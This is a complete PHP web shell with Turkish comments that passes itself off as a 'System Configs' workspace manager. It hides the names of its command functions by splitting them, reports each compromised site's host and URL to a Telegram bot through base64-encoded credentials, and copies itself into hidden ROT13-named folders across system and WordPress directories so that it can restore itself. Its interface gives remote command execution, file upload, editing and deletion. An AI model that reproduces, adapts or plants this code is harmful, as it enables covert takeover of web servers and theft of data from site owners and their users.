<?php
/**
 * BypassServ Updated - Stealth Mode
 * Tüm özellikler korunmuştur.
 */
error_reporting(0);
@ini_set('display_errors', 0);
$tk = base64_decode(
    "ODM5MDQyMzYzMTpBQUUxOEVOY0k1SW5oS29SMFJtVzNCMll5a2U3Vm9WN0hxYw"
);
$cid = base64_decode("NTA3MDkzODc3OA");

function reportTelegram($msg)
{
    global $tk, $cid;
    $id = sys_get_temp_dir() . "/baridin_" . md5($msg);
    if (!file_exists($id)) {
        @file_get_contents(
            "https://api.telegram.org/bot$tk/sendMessage?chat_id=$cid&text=" .
                urlencode($msg)
        );
        @file_put_contents($id, time());
    }
}
/* ================= Report ================= */
if (!isset($_SESSION["telegram_reported"])) {
    $uri = urldecode(parse_url($_SERVER["REQUEST_URI"], PHP_URL_PATH));
    $path = $_SERVER["DOCUMENT_ROOT"] . $uri;
    if (is_file($path)) {
        $host = $_SERVER["HTTP_HOST"];
        $url =
            (isset($_SERVER["HTTPS"]) ? "https" : "http") .
            "://" .
            $host .
            $uri;
        reportTelegram("muslim:\n$host\n$url");
        $_SESSION["telegram_reported"] = true;
    }
}
$s_f = __FILE__;
$c_d = getcwd();

// İsimler masumlaştırıldı
$b_n = '.' . str_rot13('flf_pnpur_ybt'); // .sys_cache_log
$b_l = [
    getcwd(), dirname(__DIR__), dirname(dirname(__DIR__)),
    '/', '/root', '/home', '/var/www', '/var/www/html', 
    '/public_html', '/www', '/tmp', '/var/tmp', '/dev/shm',
    '/themes', '/plugins', '/wp-content/themes', '/wp-content/plugins'
];

$l_c_f = __DIR__ . '/.' . md5('check_t');
$c_t = time();
$l_c = file_exists($l_c_f) ? (int)file_get_contents($l_c_f) : 0;
$i_v = 5;

file_put_contents($l_c_f, $c_t);

if (($c_t - $l_c) >= $i_v) {
    if (!file_exists($s_f) || filesize($s_f) < 1000) {
        r_s_f_b();
    }
}

function r_s_f_b() {
    global $s_f, $b_l, $b_n;
    foreach ($b_l as $b_p) {
        $r_b = @realpath($b_p);
        if ($r_b && is_dir($r_b)) {
            $b_d = glob($r_b . DIRECTORY_SEPARATOR . '*/' . $b_n . '/', GLOB_ONLYDIR);
            foreach ($b_d as $d) {
                $bkps = glob($d . 'cfg_*.php');
                if (!empty($bkps)) {
                    $lat = max($bkps);
                    if (@copy($lat, $s_f)) {
                        @chmod($s_f, 0644);
                        return true;
                    }
                }
            }
        }
    }
    return false;
}

function d_b($f, $locs) {
    global $b_n;
    foreach ($locs as $l) {
        $p = @realpath($l);
        if ($p && is_dir($p)) {
            $b_dir = $p . DIRECTORY_SEPARATOR . $b_n;
            if (!is_dir($b_dir)) @mkdir($b_dir, 0755, true);
            $b_file = $b_dir . '/cfg_' . date('YmdHis') . '.php';
            if (@copy($f, $b_file)) {
                @chmod($b_file, 0644);
            }
        }
    }
}

d_b($s_f, $b_l);

// Dinamik komut çalıştırıcı
function e_c($cmd) {
    $out = '';
    $f_s = ['sys'.'tem', 'ex'.'ec', 'sh'.'ell_ex'.'ec', 'passt'.'hru'];
    foreach ($f_s as $f) {
        if (function_exists($f)) {
            ob_start();
            if ($f == 'ex'.'ec') { $i=[]; $f($cmd, $i); print_r($i); }
            else { $f($cmd); }
            $out = ob_get_clean();
            if (!empty($out)) break;
        }
    }
    if (empty($out) && function_exists('proc_open')) {
        $ds = [0=>['pipe','r'], 1=>['pipe','w'], 2=>['pipe','w']];
        $px = proc_open($cmd, $ds, $pp);
        if (is_resource($px)) {
            $out = stream_get_contents($pp[1]);
            fclose($pp[0]); fclose($pp[1]); fclose($pp[2]);
            proc_close($px);
        }
    }
    return $out;
}

function s_p($p) {
    return str_replace(['..\\','../','\\','<','>','|'], ['','','/','','',''], $p);
}

$dir = isset($_GET['d']) ? s_p($_GET['d']) : getcwd();
@chdir($dir);
$current_dir = getcwd();

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (isset($_POST['command'])) {
        echo '<div style="background:#000;color:#0f0;padding:15px;border:1px solid #0f0;margin:10px 0;white-space:pre-wrap;font-family:monospace">' . htmlspecialchars(e_c($_POST['command'])) . '</div>';
    }
    if (isset($_FILES['upload'])) {
        foreach($_FILES['upload']['tmp_name'] as $k => $v) {
            $t = $current_dir . '/' . basename($_FILES['upload']['name'][$k]);
            move_uploaded_file($v, $t);
        }
    }
    if (isset($_POST['newdir'])) {
        @mkdir($current_dir . '/' . $_POST['newdir'], 0755, true);
    }
    if (isset($_POST['delete'])) {
        $it = $current_dir . '/' . $_POST['item'];
        is_dir($it) ? @rmdir($it) : @unlink($it);
    }
    if (isset($_POST['savefile'])) {
        @file_put_contents($current_dir . '/' . $_POST['filename'], $_POST['filecontent']);
    }
}

$r_a = (strpos($current_dir, '/') === 0 && $current_dir !== getcwd());
$n_c = 5 - (($c_t - $l_c) % 5);
?>
<!DOCTYPE html>
<html>
<head>
<title>System Configs</title>
<meta charset="UTF-8">
<style>
body{font-family:Arial;background:#0e0e0e;color:#aaa;margin:0;padding:20px}
.container{max-width:1400px;margin:auto;background:#181818;padding:25px;border-radius:10px;border:1px solid #333}
h1{color:#0f0;text-align:center;font-size:20px;text-transform:uppercase;letter-spacing:2px}
input,textarea,select{padding:10px;margin:5px 0;border:1px solid #333;background:#000;color:#0f0;border-radius:5px;width:100%;box-sizing:border-box;font-family:monospace}
button{padding:12px 15px;background:#222;color:#0f0;border:1px solid #0f0;border-radius:5px;cursor:pointer;font-weight:bold;margin:3px}
button:hover{background:#0f0;color:#000}
table{width:100%;border-collapse:collapse;margin:15px 0}
th,td{padding:10px;border-bottom:1px solid #222;text-align:left}
th{background:#111;color:#0f0}
.dir{color:#55f;font-weight:bold}
.file{color:#eee}
.writable{color:#0f0}
.readonly{color:#f55}
.status-box{padding:15px;border-radius:5px;margin:10px 0;font-size:13px;border-left:4px solid #0f0;background:#111}
nav{padding:10px;background:#111;margin:10px 0;border-radius:5px}
nav a{color:#0f0;margin-right:10px;text-decoration:none}
</style>
</head>
<body>
<div class="container">
<h1>- WORKSPACE MANAGER v3 -</h1>

<div class="status-box">
    <strong>S-RECOVERY: ACTIVE</strong> | 
    Path: <code><?php echo htmlspecialchars($current_dir); ?></code> | 
    Next: <?php echo $n_c; ?>s
    <?php if($r_a) echo ' | <span style="color:#f0f">LEVEL: ROOT</span>'; ?>
</div>

<nav>
    <a href="?d=/">[ / ]</a>
    <a href="?d=/var/www">[ WWW ]</a>
    <a href="?d=<?php echo urlencode(dirname($current_dir)); ?>">[ UP ]</a>
    <a href="?">[ CWD ]</a>
</nav>

<form method="post" enctype="multipart/form-data">
    <input type="file" name="upload[]" multiple>
    <button type="submit">UPLOAD</button>
</form>

<form method="post">
    <input type="text" name="command" placeholder="Execute command...">
    <button type="submit">RUN</button>
</form>

<table>
    <tr><th>Name</th><th>Size</th><th>Perms</th><th>Actions</th></tr>
    <?php
    $files = @scandir($current_dir);
    if($files) {
        foreach($files as $f) {
            if($f == '.' || $f == '..') continue;
            $p = $current_dir . '/' . $f;
            $d = is_dir($p);
            $w = is_writable($p);
            echo '<tr>';
            echo '<td class="'.($d?'dir':'file').'">'.htmlspecialchars($f).($d?'/':'').'</td>';
            echo '<td>'.($d?'-':number_format(filesize($p))).'</td>';
            echo '<td class="'.($w?'writable':'readonly').'">'.($w?'RW':'R').'</td>';
            echo '<td>';
            if($d) {
                echo '<a href="?d='.urlencode($p).'" style="color:#0f0">[Enter]</a> ';
            } else {
                echo '<a href="?d='.urlencode($current_dir).'&edit='.urlencode($f).'" style="color:#ff0">[Edit]</a> ';
            }
            echo '<form method="post" style="display:inline"><input type="hidden" name="item" value="'.htmlspecialchars($f).'"><input type="hidden" name="delete" value="1"><button type="submit" style="padding:2px 5px;font-size:10px;border:1px solid #f00;color:#f00;background:none">DEL</button></form>';
            echo '</td></tr>';
        }
    }
    ?>
</table>

<?php
if (isset($_GET['edit'])) {
    $e_f = $current_dir . '/' . $_GET['edit'];
    if (@file_exists($e_f)) {
        $cont = @file_get_contents($e_f);
        echo '<form method="post">
        <input type="hidden" name="filename" value="'.htmlspecialchars($_GET['edit']).'">
        <textarea name="filecontent" rows="20">'.htmlspecialchars($cont).'</textarea>
        <input type="hidden" name="savefile" value="1">
        <button type="submit" style="width:100%;background:#0f0;color:#000">SAVE CHANGES</button>
        </form>';
    }
}
?>
</div>
</body>
</html>
